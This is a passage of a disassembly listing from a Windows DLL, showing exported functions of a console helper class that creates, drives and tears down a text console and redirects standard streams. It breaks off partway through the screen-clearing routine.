; Attributes: bp-based frame

		public Ordinal485
Ordinal485	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		lea	eax, [esi+54h]
		pop	esi
		leave
		retn
Ordinal485	endp

; Exported entry 486.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal486
Ordinal486	proc near		; CODE XREF: Ordinal480+21p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		xor	eax, eax
		cmp	[esi+50h], eax
		lea	ecx, [ebp+var_C]
		setnz	al
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal486	endp

; Exported entry 487.
; Exported entry 488.
; Exported entry 489.
; Exported entry 490.
; Exported entry 491.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal490
Ordinal490	proc near		; DATA XREF: .rdata:6AF59538o
					; .rdata:6AF5953Co ...
		retn	4		; ccL30_487
Ordinal490	endp			; ccL30_488
					; ccL30_489
					; ccL30_490
; Exported entry 493.
; Exported entry 494.
; Exported entry 495.
; Exported entry 496.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal495
Ordinal495	proc near		; DATA XREF: .rdata:6AF59550o
					; .rdata:6AF59554o ...
		mov	eax, [ecx]	; ccL30_493
					; ccL30_494
					; ccL30_495
		jmp	dword ptr [eax+2Ch]
Ordinal495	endp

; Exported entry 497.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal497
Ordinal497	proc near		; DATA XREF: .rdata:6AF59530o
					; .rdata:6AF5CE38o ...
		push	offset aCconsoleInitin ; "CConsole::InitInstance()\n"
		call	sub_6AF31006
		xor	eax, eax
		pop	ecx
		inc	eax
		retn
Ordinal497	endp

; Exported entry 498.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal498
Ordinal498	proc near		; DATA XREF: .rdata:6AF59534o
					; .rdata:6AF5CE3Co ...
		push	offset aCconsoleExitin ; "CConsole::ExitInstance()\n"
		call	sub_6AF31006
		pop	ecx
		retn
Ordinal498	endp

; Exported entry 500.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal500
Ordinal500	proc near		; CODE XREF: Ordinal499+56p
					; DATA XREF: .rdata:off_6AF66098o

Buffer		= _INPUT_RECORD	ptr -288h
NumberOfEvents	= dword	ptr -8
NumberOfEventsRead= dword ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 288h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		jmp	loc_6AF3E27F
; ---------------------------------------------------------------------------

loc_6AF3E1EC:				; CODE XREF: Ordinal500+B5j
		mov	eax, [ebp+NumberOfEvents]
		xor	ebx, ebx
		cmp	eax, ebx
		jz	loc_6AF3E2B5
		cmp	eax, 20h
		mov	[ebp+NumberOfEventsRead], ebx
		jb	short loc_6AF3E204
		push	20h
		pop	eax

loc_6AF3E204:				; CODE XREF: Ordinal500+26j
		lea	ecx, [ebp+NumberOfEventsRead]
		push	ecx		; lpNumberOfEventsRead
		push	eax		; nLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	dword ptr [esi+38h] ; hConsoleInput
		call	ds:ReadConsoleInputA
		test	eax, eax
		jz	loc_6AF3E2A2
		cmp	[ebp+NumberOfEventsRead], ebx
		jz	short loc_6AF3E2A2
		jbe	short loc_6AF3E27F
		lea	edi, [ebp+Buffer.Event]

loc_6AF3E22E:				; CODE XREF: Ordinal500+A4j
		movzx	eax, word ptr [edi-4]
		dec	eax
		jz	short loc_6AF3E26E
		dec	eax
		jz	short loc_6AF3E264
		dec	eax
		dec	eax
		jz	short loc_6AF3E25A
		sub	eax, 4
		jz	short loc_6AF3E250
		sub	eax, 8
		jnz	short loc_6AF3E276
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+28h]
		jmp	short loc_6AF3E276
; ---------------------------------------------------------------------------

loc_6AF3E250:				; CODE XREF: Ordinal500+66j
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+24h]
		jmp	short loc_6AF3E276
; ---------------------------------------------------------------------------

loc_6AF3E25A:				; CODE XREF: Ordinal500+61j
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+20h]
		jmp	short loc_6AF3E276
; ---------------------------------------------------------------------------

loc_6AF3E264:				; CODE XREF: Ordinal500+5Dj
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+1Ch]
		jmp	short loc_6AF3E276
; ---------------------------------------------------------------------------

loc_6AF3E26E:				; CODE XREF: Ordinal500+5Aj
		mov	eax, [esi]
		push	edi
		mov	ecx, esi
		call	dword ptr [eax+18h]

loc_6AF3E276:				; CODE XREF: Ordinal500+6Bj
					; Ordinal500+75j ...
		inc	ebx
		add	edi, 14h
		cmp	ebx, [ebp+NumberOfEventsRead]
		jb	short loc_6AF3E22E

loc_6AF3E27F:				; CODE XREF: Ordinal500+Ej
					; Ordinal500+4Dj
		lea	eax, [ebp+NumberOfEvents]
		push	eax		; lpNumberOfEvents
		push	dword ptr [esi+38h] ; hConsoleInput
		call	ds:GetNumberOfConsoleInputEvents
		test	eax, eax
		jnz	loc_6AF3E1EC
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleProces ; "CConsole::ProcessEvents() : GetNumberOf"...
		jmp	short loc_6AF3E2AE
; ---------------------------------------------------------------------------

loc_6AF3E2A2:				; CODE XREF: Ordinal500+42j
					; Ordinal500+4Bj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsoleProc_0 ; "CConsole::ProcessEvents() : ReadConsole"...

loc_6AF3E2AE:				; CODE XREF: Ordinal500+C7j
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF3E2B5:				; CODE XREF: Ordinal500+1Aj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal500	endp


; =============== S U B	R O U T	I N E =======================================


; BOOL __stdcall HandlerRoutine(DWORD)
HandlerRoutine	proc near		; DATA XREF: Ordinal481+44o
					; Ordinal480+17Ao

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		sub	eax, 0
		jz	short loc_6AF3E309
		dec	eax
		jz	short loc_6AF3E2FC
		dec	eax
		jz	short loc_6AF3E2EF
		sub	eax, 3
		jz	short loc_6AF3E2E2
		dec	eax
		jz	short loc_6AF3E2D5
		xor	eax, eax
		jmp	short locret_6AF3E314
; ---------------------------------------------------------------------------

loc_6AF3E2D5:				; CODE XREF: HandlerRoutine+15j
		mov	ecx, dword_6AF68254
		mov	eax, [ecx]
		call	dword ptr [eax+3Ch]
		jmp	short locret_6AF3E314
; ---------------------------------------------------------------------------

loc_6AF3E2E2:				; CODE XREF: HandlerRoutine+12j
		mov	ecx, dword_6AF68254
		mov	eax, [ecx]
		call	dword ptr [eax+38h]
		jmp	short locret_6AF3E314
; ---------------------------------------------------------------------------

loc_6AF3E2EF:				; CODE XREF: HandlerRoutine+Dj
		mov	ecx, dword_6AF68254
		mov	eax, [ecx]
		call	dword ptr [eax+2Ch]
		jmp	short locret_6AF3E314
; ---------------------------------------------------------------------------

loc_6AF3E2FC:				; CODE XREF: HandlerRoutine+Aj
		mov	ecx, dword_6AF68254
		mov	eax, [ecx]
		call	dword ptr [eax+34h]
		jmp	short locret_6AF3E314
; ---------------------------------------------------------------------------

loc_6AF3E309:				; CODE XREF: HandlerRoutine+7j
		mov	ecx, dword_6AF68254
		mov	eax, [ecx]
		call	dword ptr [eax+30h]

locret_6AF3E314:			; CODE XREF: HandlerRoutine+19j
					; HandlerRoutine+26j ...
		retn	4
HandlerRoutine	endp

; Exported entry 477.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal477
Ordinal477	proc near		; CODE XREF: Ordinal901+11p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1381
		lea	ecx, [esi+174h]
		mov	dword ptr [esi], offset	off_6AF59520
		call	Ordinal1278
		mov	ecx, esi
		mov	dword_6AF68254,	esi
		call	Ordinal479
		mov	eax, esi
		pop	esi
		retn
Ordinal477	endp

; Exported entry 481.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal481
Ordinal481	proc near		; CODE XREF: Ordinal478+9p
					; Ordinal480+1C1p ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	ebx, ecx
		mov	eax, [ebx]
		push	2710h
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3E364
		push	offset aCconsoleDestro ; "CConsole::Destroy() :	Terminate() == FA"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3E364:				; CODE XREF: Ordinal481+16j
		push	edi
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [ebx+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		cmp	[ebx+50h], edi
		mov	esi, ds:GetLastError
		jz	short loc_6AF3E3A3
		push	edi		; Add
		push	offset HandlerRoutine ;	HandlerRoutine
		call	ds:SetConsoleCtrlHandler
		test	eax, eax
		jnz	short loc_6AF3E3A3
		call	esi ; GetLastError
		push	eax		; Args
		push	offset aCconsoleDest_0 ; "CConsole::Destroy() :	SetConsoleCtrlHan"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF3E3A3:				; CODE XREF: Ordinal481+41j
					; Ordinal481+51j
		mov	eax, [ebx+38h]
		cmp	eax, edi
		jz	short loc_6AF3E3C7
		push	dword ptr [ebx+6Ch] ; dwMode
		push	eax		; hConsoleHandle
		call	ds:SetConsoleMode
		test	eax, eax
		jnz	short loc_6AF3E3C7
		call	esi ; GetLastError
		push	eax		; Args
		push	offset aCconsoleDest_1 ; "CConsole::Destroy() :	SetConsoleMode() "...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF3E3C7:				; CODE XREF: Ordinal481+67j
					; Ordinal481+75j
		mov	eax, [ebx+3Ch]
		cmp	eax, edi
		mov	esi, ds:SetStdHandle
		jz	short loc_6AF3E3D9
		push	eax		; hHandle
		push	0FFFFFFF5h	; nStdHandle
		call	esi ; SetStdHandle

loc_6AF3E3D9:				; CODE XREF: Ordinal481+91j
		mov	eax, [ebx+38h]
		cmp	eax, edi
		jz	short loc_6AF3E3E5
		push	eax		; hHandle
		push	0FFFFFFF6h	; nStdHandle
		call	esi ; SetStdHandle

loc_6AF3E3E5:				; CODE XREF: Ordinal481+9Dj
		mov	esi, [ebx+44h]
		cmp	esi, edi
		jz	short loc_6AF3E3F7
		mov	edi, ds:_iob
		push	8
		pop	ecx
		rep movsd

loc_6AF3E3F7:				; CODE XREF: Ordinal481+A9j
		mov	esi, [ebx+48h]
		test	esi, esi
		jz	short loc_6AF3E40C
		mov	edi, ds:_iob
		push	8
		add	edi, 20h
		pop	ecx
		rep movsd

loc_6AF3E40C:				; CODE XREF: Ordinal481+BBj
		mov	esi, [ebx+4Ch]
		test	esi, esi
		jz	short loc_6AF3E421
		mov	edi, ds:_iob
		push	8
		add	edi, 40h
		pop	ecx
		rep movsd

loc_6AF3E421:				; CODE XREF: Ordinal481+D0j
		xor	esi, esi
		cmp	[ebx+50h], esi
		pop	edi
		jz	short loc_6AF3E432
		push	1
		call	ds:?sync_with_stdio@ios_base@std@@SA_N_N@Z ; std::ios_base::sync_with_stdio(bool)
		pop	ecx

loc_6AF3E432:				; CODE XREF: Ordinal481+E6j
		mov	eax, [ebx+40h]
		cmp	eax, esi
		jz	short loc_6AF3E444
		push	eax		; File
		call	ds:fclose
		pop	ecx
		mov	[ebx+40h], esi

loc_6AF3E444:				; CODE XREF: Ordinal481+F6j
		cmp	[ebx+70h], esi
		jz	short loc_6AF3E44F
		call	ds:FreeConsole

loc_6AF3E44F:				; CODE XREF: Ordinal481+106j
		mov	ecx, ebx
		call	Ordinal479
		lea	ecx, [ebp+var_C]
		mov	[ebx+50h], esi
		call	Ordinal1230
		xor	eax, eax
		pop	esi
		inc	eax
		pop	ebx
		leave
		retn
Ordinal481	endp

; Exported entry 499.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal499
Ordinal499	proc near		; DATA XREF: .rdata:6AF5952Co
					; .rdata:6AF5CE34o ...

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		push	offset aCconsoleRun ; "CConsole::Run()\n"
		mov	esi, ecx
		call	sub_6AF31006
		mov	eax, [esi+38h]
		pop	ecx
		lea	ecx, [esi+4]
		mov	[ebp+var_8], eax
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		push	0
		push	dword ptr [esi+2Ch]
		lea	ecx, [ebp+var_14]
		mov	[ebp+var_4], eax
		call	Ordinal1267

loc_6AF3E49A:				; CODE XREF: Ordinal499+5Bj
		mov	ecx, esi
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF3E4C6
		push	eax
		push	0FFFFFFFFh
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	2
		lea	ecx, [ebp+var_14]
		call	Ordinal1269
		sub	eax, 0
		jnz	short loc_6AF3E4C5
		mov	ecx, esi
		call	Ordinal500
		jmp	short loc_6AF3E49A
; ---------------------------------------------------------------------------

loc_6AF3E4C5:				; CODE XREF: Ordinal499+52j
		dec	eax

loc_6AF3E4C6:				; CODE XREF: Ordinal499+3Bj
		lea	ecx, [ebp+var_14]
		call	Ordinal1268
		xor	eax, eax
		pop	esi
		leave
		retn
Ordinal499	endp

; Exported entry 478.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal478
Ordinal478	proc near		; CODE XREF: sub_6AF3E6D2+3p
					; Ordinal902+2Dp ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF59520
		call	Ordinal481
		and	dword_6AF68254,	0
		lea	ecx, [esi+174h]
		call	Ordinal1279
		mov	ecx, esi
		pop	esi
		jmp	Ordinal1382
Ordinal478	endp

; Exported entry 480.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall Ordinal480(LPVOID lpParameter,	int, int, DWORD	dwMode)
		public Ordinal480
Ordinal480	proc near		; CODE XREF: Ordinal1052+10p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
dwMode		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		xor	edi, edi
		push	edi
		push	0FFFFFFFFh
		lea	eax, [ebx+174h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, ebx
		call	Ordinal486
		test	eax, eax
		jz	short loc_6AF3E537
		push	offset aCconsoleCreate ; "CConsole::Create() : IsCreated() != FAL"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF3E6C1
; ---------------------------------------------------------------------------

loc_6AF3E537:				; CODE XREF: Ordinal480+28j
		cmp	[ebp+arg_0], edi
		jz	short loc_6AF3E542
		call	ds:FreeConsole

loc_6AF3E542:				; CODE XREF: Ordinal480+3Fj
		call	ds:AllocConsole
		cmp	eax, edi
		mov	[ebx+70h], eax
		jnz	short loc_6AF3E565
		cmp	[ebp+arg_0], edi
		jz	short loc_6AF3E565
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleCrea_0 ; "CConsole::Create() : AllocConsole() == "...
		jmp	loc_6AF3E6B1
; ---------------------------------------------------------------------------

loc_6AF3E565:				; CODE XREF: Ordinal480+52j
					; Ordinal480+57j
		mov	esi, ds:GetStdHandle
		push	0FFFFFFF5h	; nStdHandle
		call	esi ; GetStdHandle
		push	0FFFFFFF6h	; nStdHandle
		mov	[ebx+3Ch], eax
		call	esi ; GetStdHandle
		mov	[ebx+38h], eax
		mov	ecx, ds:_iob
		mov	[ebx+44h], ecx
		mov	ecx, ds:_iob
		add	ecx, 20h
		mov	[ebx+48h], ecx
		mov	ecx, ds:_iob
		add	ecx, 40h
		cmp	[ebx+44h], edi
		mov	[ebx+4Ch], ecx
		jz	loc_6AF3E6A5
		cmp	[ebx+48h], edi
		jz	loc_6AF3E6A5
		cmp	ecx, edi
		jz	loc_6AF3E6A5
		cmp	dword ptr [ebx+3Ch], 0FFFFFFFFh
		jz	loc_6AF3E6A5
		cmp	eax, 0FFFFFFFFh
		jz	loc_6AF3E6A5
		push	offset Format	; "r"
		push	4000h		; int
		push	eax		; __int32
		call	ds:_open_osfhandle
		pop	ecx
		pop	ecx
		push	eax		; FileHandle
		call	ds:_fdopen
		cmp	eax, edi
		pop	ecx
		pop	ecx
		mov	[ebx+40h], eax
		jnz	short loc_6AF3E5FB
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleCrea_1 ; "CConsole::Create() : m_pInputStream == "...
		jmp	loc_6AF3E6B1
; ---------------------------------------------------------------------------

loc_6AF3E5FB:				; CODE XREF: Ordinal480+EDj
		mov	edi, ds:_iob
		push	8
		pop	ecx
		mov	esi, eax
		rep movsd
		xor	esi, esi
		inc	esi
		push	esi
		call	ds:?sync_with_stdio@ios_base@std@@SA_N_N@Z ; std::ios_base::sync_with_stdio(bool)
		pop	ecx
		lea	eax, [ebx+54h]
		push	eax		; lpConsoleScreenBufferInfo
		push	dword ptr [ebx+3Ch] ; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3E632
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleCrea_2 ; "CConsole::Create() : GetConsoleScreenBu"...
		jmp	short loc_6AF3E6B1
; ---------------------------------------------------------------------------

loc_6AF3E632:				; CODE XREF: Ordinal480+127j
		lea	eax, [ebx+6Ch]
		push	eax		; lpMode
		push	dword ptr [ebx+38h] ; hConsoleHandle
		call	ds:GetConsoleMode
		test	eax, eax
		jz	short loc_6AF3E697
		push	[ebp+dwMode]	; dwMode
		push	dword ptr [ebx+38h] ; hConsoleHandle
		call	ds:SetConsoleMode
		test	eax, eax
		jz	short loc_6AF3E697
		xor	edi, edi
		cmp	[ebp+arg_4], edi
		jz	short loc_6AF3E674
		push	edi		; int
		push	edi		; dwStackSize
		push	edi		; lpThreadAttributes
		mov	ecx, ebx	; lpParameter
		call	Ordinal1383
		test	eax, eax
		jnz	short loc_6AF3E674
		push	offset aCconsoleCrea_3 ; "CConsole::Create() : CThread::Create() "...
		call	sub_6AF3102E
		jmp	short loc_6AF3E6B7
; ---------------------------------------------------------------------------

loc_6AF3E674:				; CODE XREF: Ordinal480+15Dj
					; Ordinal480+16Bj
		push	esi		; Add
		push	offset HandlerRoutine ;	HandlerRoutine
		call	ds:SetConsoleCtrlHandler
		test	eax, eax
		jnz	short loc_6AF3E692
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleCrea_4 ; "CConsole::Create() : SetConsoleCtrlHand"...
		jmp	short loc_6AF3E6B1
; ---------------------------------------------------------------------------

loc_6AF3E692:				; CODE XREF: Ordinal480+187j
		mov	[ebx+50h], esi
		jmp	short loc_6AF3E6C1
; ---------------------------------------------------------------------------

loc_6AF3E697:				; CODE XREF: Ordinal480+146j
					; Ordinal480+156j
		call	ds:GetLastError
		push	eax
		push	offset aCconsoleCrea_5 ; "CConsole::Create() : GetConsoleMode()	="...
		jmp	short loc_6AF3E6B1
; ---------------------------------------------------------------------------

loc_6AF3E6A5:				; CODE XREF: Ordinal480+A2j
					; Ordinal480+ABj ...
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsoleCrea_6 ; "CConsole::Create() : m_pOldInputStream "...

loc_6AF3E6B1:				; CODE XREF: Ordinal480+65j
					; Ordinal480+FBj ...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3E6B7:				; CODE XREF: Ordinal480+177j
		pop	ecx
		mov	ecx, ebx
		xor	esi, esi
		call	Ordinal481

loc_6AF3E6C1:				; CODE XREF: Ordinal480+37j
					; Ordinal480+19Aj
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal480	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3E6D2(void *, char)
sub_6AF3E6D2	proc near		; DATA XREF: .rdata:off_6AF59520o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal478
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3E6E8
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3E6E8:				; CODE XREF: sub_6AF3E6D2+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3E6D2	endp

; Exported entry 511.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal511
Ordinal511	proc near		; CODE XREF: Ordinal513+23p
					; Ordinal509+1Bp ...

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jz	short loc_6AF3E71A
		push	eax		; hObject
		call	ds:CloseHandle
		or	dword ptr [esi+8], 0FFFFFFFFh

loc_6AF3E71A:				; CODE XREF: Ordinal511+1Fj
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF3E72D
		push	eax		; File
		call	ds:fclose
		and	dword ptr [esi+4], 0
		pop	ecx

loc_6AF3E72D:				; CODE XREF: Ordinal511+31j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	esi
		leave
		retn
Ordinal511	endp

; Exported entry 513.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal513
Ordinal513	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	edi, [esi+8]
		or	dword ptr [esi+8], 0FFFFFFFFh
		mov	ecx, esi
		call	Ordinal511
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, edi
		pop	edi
		pop	esi
		leave
		retn
Ordinal513	endp

; Exported entry 515.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal515
Ordinal515	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -28h
var_10		= byte ptr -10h
NumberOfAttrsWritten= dword ptr	-4
lpCharacter	= dword	ptr  8
wAttribute	= word ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		cmp	dword ptr [esi+8], 0FFFFFFFFh
		jnz	short loc_6AF3E79F
		push	offset aCconsolewndPri ; "CConsoleWnd::PrintLine() : m_hScreenBuf"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF3E832
; ---------------------------------------------------------------------------

loc_6AF3E79F:				; CODE XREF: Ordinal515+1Dj
		push	ebx
		mov	ebx, [ebp+lpCharacter]
		test	ebx, ebx
		push	edi		; Args
		jz	short loc_6AF3E823
		mov	edi, ds:lstrlenA
		push	ebx		; lpString
		call	edi ; lstrlenA
		test	eax, eax
		jle	short loc_6AF3E823
		lea	eax, [ebp+ConsoleScreenBufferInfo]
		push	eax		; lpConsoleScreenBufferInfo
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3E7D4
		call	ds:GetLastError
		push	eax
		push	offset aCconsolewndP_0 ; "CConsoleWnd::PrintLine() : GetConsoleSc"...
		jmp	short loc_6AF3E81B
; ---------------------------------------------------------------------------

loc_6AF3E7D4:				; CODE XREF: Ordinal515+56j
		push	ebx		; lpString
		call	edi ; lstrlenA
		lea	ecx, [ebp+NumberOfAttrsWritten]
		push	ecx		; lpNumberOfCharsWritten
		push	dword ptr [ebp+ConsoleScreenBufferInfo.dwCursorPosition.X] ; dwWriteCoord
		mov	[ebp+NumberOfAttrsWritten], eax
		push	eax		; nLength
		push	ebx		; lpCharacter
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:WriteConsoleOutputCharacterA
		test	eax, eax
		jz	short loc_6AF3E80F
		lea	eax, [ebp+NumberOfAttrsWritten]
		push	eax		; lpNumberOfAttrsWritten
		push	dword ptr [ebp+ConsoleScreenBufferInfo.dwCursorPosition.X] ; dwWriteCoord
		push	[ebp+NumberOfAttrsWritten] ; nLength
		push	dword ptr [ebp+wAttribute] ; wAttribute
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:FillConsoleOutputAttribute
		test	eax, eax
		jz	short loc_6AF3E80F
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF3E830
; ---------------------------------------------------------------------------

loc_6AF3E80F:				; CODE XREF: Ordinal515+80j
					; Ordinal515+9Aj
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndP_1 ; "CConsoleWnd::PrintLine() : WriteConsole"...

loc_6AF3E81B:				; CODE XREF: Ordinal515+64j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3E82D
; ---------------------------------------------------------------------------

loc_6AF3E823:				; CODE XREF: Ordinal515+38j
					; Ordinal515+45j
		push	offset aCconsolewndP_2 ; "CConsoleWnd::PrintLine() : szText == NU"...
		call	sub_6AF3102E

loc_6AF3E82D:				; CODE XREF: Ordinal515+B3j
		pop	ecx
		xor	esi, esi

loc_6AF3E830:				; CODE XREF: Ordinal515+9Fj
		pop	edi
		pop	ebx

loc_6AF3E832:				; CODE XREF: Ordinal515+2Cj
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal515	endp

; Exported entry 516.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal516
Ordinal516	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -2Ch
var_14		= byte ptr -14h
NumberOfAttrsWritten= dword ptr	-8
dwWriteCoord	= COORD	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3E869
		push	offset aCconsolewndCle ; "CConsoleWnd::Clear() : m_hScreenBuffer "...
		jmp	short loc_6AF3E8DD
; ---------------------------------------------------------------------------

loc_6AF3E869:				; CODE XREF: Ordinal516+1Fj
		lea	ecx, [ebp+ConsoleScreenBufferInfo]
		push	ecx		; lpConsoleScreenBufferInfo
		push	eax		; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3E87F
		push	offset aCconsolewndC_0 ; "CConsoleWnd::Clear() : GetConsoleScreen"...
		jmp	short loc_6AF3E8DD
; ---------------------------------------------------------------------------

loc_6AF3E87F:				; CODE XREF: Ordinal516+35j
		movsx	ecx, [ebp+ConsoleScreenBufferInfo.dwSize.X]
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwSize.Y]
		and	[ebp+dwWriteCoord.X], 0
		imul	eax, ecx
		and	[ebp+dwWriteCoord.Y], 0
		lea	ecx, [ebp+NumberOfAttrsWritten]
		push	ecx		; lpNumberOfCharsWritten
		push	dword ptr [ebp+dwWriteCoord.X] ; dwWriteCoord
		mov	[ebp+NumberOfAttrsWritten], eax
		push	eax		; nLength
		push	20h		; cCharacter
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:FillConsoleOutputCharacterA
		test	eax, eax
		jz	short loc_6AF3E8D8
		lea	eax, [ebp+NumberOfAttrsWritten]
		push	eax		; lpNumberOfAttrsWritten
		push	dword ptr [ebp+dwWriteCoord.X] ; dwWriteCoord
		push	[ebp+NumberOfAttrsWritten] ; nLength
		push	dword ptr [ebp+ConsoleScreenBufferInfo.wAttributes] ; wAttribute
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:FillConsoleOutputAttribute
		test	eax, eax
		jz	short loc_6AF3E8D8
		push	dword ptr [ebp+dwWriteCoord.X] ; dwCursorPosition
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleCursorPosition
		mov	esi, eax
		jmp	short loc_6AF3E8E5
; ---------------------------------------------------------------------------

loc_6AF3E8D8:				; CODE XREF: Ordinal516+6Bj
					; Ordinal516+85j
		push	offset aCconsolewndC_1 ; "CConsoleWnd::Clear() : FillConsoleOutpu"...

loc_6AF3E8DD:				; CODE XREF: Ordinal516+26j
